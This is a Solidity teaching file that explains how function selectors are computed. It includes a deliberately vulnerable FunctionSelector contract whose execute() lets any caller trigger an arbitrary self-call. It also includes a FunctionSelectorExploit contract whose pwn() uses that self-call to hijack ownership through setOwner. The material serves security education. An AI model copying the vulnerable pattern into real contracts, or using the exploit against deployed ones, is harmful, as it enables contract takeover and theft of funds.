// SPDX-License-Identifier: MIT

/**
How does call encode which function to call?
Function selectors determine which function to call.

It is the first 4 bytes of data passed into call.

Here is an example to call foo(uint256,address) with inputs 123 and 
0x5B38Da6a701c568545dCfcB03FcB875f56beddC4.

0xa68b44f8000000000000000000000000000000000000000000000000000000000000007b0000000000000000000000005b38da6a701c568545dcfcb03fcb875f56beddc4

First 4 bytes, 0xa68b44f8 is the function selector. Rest are the inputs.

How do you get 0xa68b44f8 from foo(uint256,address)?
Function selector is computed by hashing the function signature and then taking the first 4 bytes.

bytes4(keccak256(bytes("foo(uint256,address)")))

https://www.youtube.com/watch?v=Mn4e4w8h6n8
*/


pragma solidity ^0.8.17;

contract FunctionSelector {
    address public owner = address(this);

    function setOwner(address _owner) external {
        require(msg.sender == owner, "not owner");
        owner = _owner;
    }

    function execute(bytes4 _func) external {
        (bool executed, ) = address(this).call(
            abi.encodeWithSelector(_func, msg.sender)
        );
        require(executed, "failed)");
    }
}

interface IFunctionSelector {
    function execute(bytes4 func) external;
}

contract FunctionSelectorExploit {
    IFunctionSelector public target;

    constructor(address _target) {
        target = IFunctionSelector(_target);
    }

    function pwn() external {
        target.execute(bytes4(keccak256(bytes("setOwner(address)"))));
    }
}
